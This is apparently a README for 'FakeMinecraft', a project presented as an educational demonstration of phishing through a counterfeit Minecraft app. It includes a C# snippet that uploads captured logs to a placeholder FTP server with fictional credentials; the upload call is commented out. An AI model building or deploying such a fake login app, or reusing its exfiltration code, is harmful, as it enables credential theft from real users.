# FakeMinecraft

FakeMinecraft is an educational project created to illustrate how easily a phishing attack can be carried out in the current digital landscape.

Counterfeiting a website/application and its most basic functions is both simple and swift. This project is developed exclusively for educational and demonstrative purposes.

The credentials provided within it, as well as the FTP server address, are _**entirely fictional**_.

![](img/screen1.png 'Screen of program')

![](img/screen2.png 'Screen of program')

The part of the code responsible for sending data to the FTP server, the data is fictitious.

```C#
var userFtpLogin = "admin";
var userFtpPassword = "admin";
WebClient client = new WebClient();
client.Credentials = new NetworkCredential(userFtpLogin, userFtpPassword);

var fileOnSite = "ftp://example/FakeMinecraft/logs.txt";
//client.UploadFile(fileOnSite, WebRequestMethods.Ftp.UploadFile, "logs.txt");
Thread.Sleep(3000);
```
